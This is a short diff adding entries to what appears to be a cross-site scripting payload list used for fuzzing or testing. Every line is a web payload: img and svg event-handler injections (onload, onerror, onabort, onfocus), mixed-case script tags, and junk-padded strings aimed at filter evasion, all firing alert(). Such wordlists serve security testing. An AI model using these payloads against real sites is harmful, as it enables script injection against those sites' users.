@@ -1,3 +1,8 @@
+<img src="1"onload=alert(1)>
+&lt;svg/onload=alert(1);onabort=alert(2)//
+<img src="1" onerror=alert(1)>
+ê€ó³œ¹¿Ÿæñ23{}":?>><>?:"{}+_)(*&^%$#@!) &lt;svg/onabort=alert(3)//
+ê€ó³œ¹¿Ÿæñ23{}":?>><>?:"{}+_)(*&^%$#@!) &lt;svg/onabort=alert(3)//  <svg/onload=alert(1) onfocus=alert(2)//
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
 <script>alert(123)</script>
